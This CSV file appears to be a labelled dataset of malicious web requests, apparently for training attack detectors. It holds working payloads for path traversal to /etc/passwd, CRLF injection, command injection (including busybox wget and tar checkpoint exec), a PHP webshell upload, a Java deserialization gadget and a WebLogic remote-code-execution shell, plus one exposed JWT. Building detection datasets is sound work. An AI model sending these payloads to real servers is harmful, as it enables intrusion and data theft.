id,method,user_agent,url,refer,body,lable
1342,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?__mode=%00%0D%0AX-foo:%20bar&__mode=step2&username=241575,,,4
341,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/images/products/fruit_press.jpg%0d%0aBCC%3ai0j6nsmgpy0vwtnkzfd8chk42v8owgm4ex2oubkz9@burpcollaborator.net%0d%0alvr%3a%20n,http://121.4.111.58:3000/,"GET /assets/public/images/products/fruit_press.jpg%0d%0aBCC%3ai0j6nsmgpy0vwtnkzfd8chk42v8owgm4ex2oubkz9@burpcollaborator.net%0d%0alvr%3a%20n HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LZ2NxEqypze8n3Q49a7wPAoXU5Ty3HzMS1pU7EdWml5XMoYrjJgkbV6RD1OB; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxQG1haWwuY29tIiwicGFzc3dvcmQiOiIwNWE2NzFjNjZhZWZlYTEyNGNjMDhiNzZlYTZkMzBiYiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImRlZjIzYTQyZjUzODc5MjI1MzI4NmIwNjk2YmZiZWE0YjQzZDgxNTBlOGU0NmM3OTFkMDUzZTg1NmFlZDk2ZDYiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTAzLTE0VDAyOjM1OjI0LjAzMloiLCJ1cGRhdGVkQXQiOiIyMDIyLTAzLTE0VDA3OjAwOjQ2LjQxOFoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDcyNDEyNDYsImV4cCI6MTY0NzI1OTI0Nn0.TSLXboUDg8aTljBymqyzsybLcGCsBt2n6CmkOxjIEkylSKIkHFxaPgsq_fy5fqHItWi6lXx4xBwOEY71Wo53gKgCh9F-kaw7EUuodWHK1An4oZzq3474q7Mvzmw7pTd1akaGivae4RZJtvAzqDPmis34PgVEpgBPxoqc2n",4
694,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/sys//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /contract/swagger/v2/swagger.yaml HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /sys//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
682,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20942968567%20%2b%20809972311%22%0A%27,,,4
655,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qys/webapp//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /qys/webapp//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1282,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",/v1/backend1,,"CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/RCE.php&data=poc by agun<?php if(isset($_REQUEST['cmd'])){ echo ""<pre>""; $cmd = ($_REQUEST['cmd']); system($cmd); echo ""</pre>""; die; }?>",4
595,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/8953.250ed1ff8b838b373cb2.js,http://124.70.151.147:9180/,"GET /qyswebapp/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/8953.250ed1ff8b838b373cb2.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
122,\xAC\xED\0\x05sr\0\x11java.util.HashSet\xBAD\x85\x95\x96\xB8\xB74\x03\0\0xpw,,"\0\0\0\x02?@\0\0\0\0\0\x01sr\04org.apache.commons.collections.keyvalue.TiedMapEntry\x8A\xAD\xD2\x9B9\xC1\x1F\xDB\x02\0\x02L\0\x03keyt\0\x12Ljava/lang/Object;L\0\x03mapt\0\x0FLjava/util/Map;xpt\0\x03foosr\0*org.apache.commons.collections.map.LazyMapn\xE5\x94\x82\x9Ey\x10\x94\x03\0\x01L\0\x07factoryt\0,Lorg/apache/commons/collections/Transformer;xpsr\0:org.apache.commons.collections.functors.ChainedTransformer0\xC7\x97\xEC(z\x97\x04\x02\0\x01[\0",,,4
696,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qys//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /error/?id=JJJ0QQQ&action=JJJ1QQQ&page=JJJ2QQQ&name=JJJ3QQQ&f=JJJ4QQQ&url=JJJ5QQQ&email=JJJ6QQQ&type=JJJ7QQQ&file=JJJ8QQQ&title=JJJ9QQQ&code=JJJ10QQQ&q=JJJ11QQQ&user=JJJ12QQQ&token=JJJ13QQQ&t=JJJ14QQQ&c=JJJ15QQQ&data=JJJ16QQQ&mode=JJJ17QQQ&order=JJJ18QQQ&lang=JJJ19QQQ&p=JJJ20QQQ&key=JJJ21QQQ&status=JJJ22QQQ&start=JJJ23QQQ&charset=JJJ24QQQ&s=JJJ25QQQ&post=JJJ26QQQ&login=JJJ27QQQ&search=JJJ28QQQ&content=JJJ29QQQ&comment=JJJ30QQQ&step=JJJ31QQQ&ajax=JJJ32QQQ&debug=JJJ33QQQ&state=JJJ34QQQ&query=JJJ35QQQ&error=JJJ36QQQ&save=JJJ37QQQ&sort=JJJ38QQQ&format=JJJ39QQQ&tab=JJJ40QQQ&offset=JJJ41QQQ&edit=JJJ42QQQ&preview=JJJ43QQQ&filter=JJJ44QQQ&from=JJJ45QQQ&view=JJJ46QQQ&a=JJJ47QQQ&limit=JJJ48QQQ&do=JJJ49QQQ&plugin=JJJ50QQQ&theme=JJJ51QQQ&text=JJJ52QQQ&test=JJJ53QQQ&path=JJJ54QQQ&pass=JJJ55QQQ&dir=JJJ56QQQ&show=JJJ57QQQ&h=JJJ58QQQ&value=JJJ59QQQ&filename=JJJ60QQQ&redirect=JJJ61QQQ&year=JJJ62QQQ&group=JJJ63QQQ&template=JJJ64QQQ&subject=JJJ65QQQ&m=JJJ66QQQ&u=JJJ67QQQ&dest=JJJ68QQQ&uri=JJJ69QQQ&continue=JJJ70QQQ&window=JJJ71QQQ&next=JJJ72QQQ&reference=JJJ73QQQ&site=JJJ74QQQ&&KQI5f=JJJ75QQQ& HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /qys//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
27,POST,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",/login.html/GponForm/diag_Form?images/,,"POST /login.html/GponForm/diag_Form?images/ HTTP/1.1 Host: 223.80.98.219:20006 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36 Connection: close Content-Length: 108 Accept-Encoding: gzip  XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox wget http://`;busybox wget http://&ipv=0",4
1443,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20932609801%20%2B%20968030049%20%20%23,,,4
4,POST,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/console/images/%252e%252e%252fconsole.portal,,"test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(""connectionHandler"");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(""getServletRequest"").invoke(obj); String cmd = req.getHeader(""CMD"");String[] cmds = System.getProperty(""os.name"").toLowerCase().contains(""window"") ? new String[]{""cmd.exe"", ""/c"", cmd} : new String[]{""/bin/sh"", ""-c"", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(""\\A"").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(""getResponse"").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')",4
1446,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44",/?arg=lilin3-cv-debug-0708-1-chief-0&arg=-c&arg=tensorflow&arg=-nprdsafe&arg=--&arg=/bin/bash,http://prophet.qihoo.net/,,4
1264,POST,,/pro/cgi-bin/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/.%%%25%33%32%25%36%35/bin/sh,,echo ; echo Test$1By$1Zsf,4
62,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20990280436%20%2B%20960820563%20%20%23,,,4
108,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/projects/wiki/activity?amp=&amp=&amp=%250d%250aCRLF-Header%3ACRLF-Value&amp=&from=2022-07-16&show_news=1&submit=%E5%BA%94%E7%94%A8&user_id=&utf8=%E2%9C%93,http://10.19.159.21:1001/projects/wiki/activity?utf8=%E2%9C%93&from=2022-07-26&user_id=&show_news=1&submit=%E5%BA%94%E7%94%A8,,4
